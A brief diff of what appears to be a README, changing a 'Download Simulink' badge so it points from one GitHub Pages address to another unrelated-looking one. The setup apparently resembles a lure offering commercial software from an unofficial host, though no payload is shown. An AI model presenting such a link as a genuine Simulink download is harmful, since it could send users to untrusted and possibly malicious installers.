@@ -2,8 +2,7 @@
 
 ## 📥 Simulink
 
-[![⬇️ Simulink](https://img.shields.io/badge/Download-Simulink-blue?style=for-the-badge&logo=mathworks)](https://simulink-graphical.github.io/.github
-)
+[![⬇️ Simulink](https://img.shields.io/badge/Download-Simulink-blue?style=for-the-badge&logo=mathworks)](https://quincygentrynnia.github.io/.github/simulink-graphical)
 
 ---
 
